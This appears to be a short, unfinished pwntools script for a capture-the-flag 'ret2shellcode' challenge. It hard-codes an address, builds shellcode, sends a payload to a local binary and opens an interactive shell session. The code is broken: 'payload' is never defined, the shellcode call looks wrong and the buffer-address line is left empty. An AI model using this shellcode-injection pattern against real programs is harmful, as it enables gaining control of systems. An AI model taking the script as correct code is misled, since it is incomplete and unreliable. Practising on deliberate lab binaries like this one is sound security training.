from pwn import *

addr = 0x0804863A

r = process('./ret2shellcode')

shellcode = asm(shellcraft.r())

#buf2.addr = 

r.sendline(payload)

r.interactive()
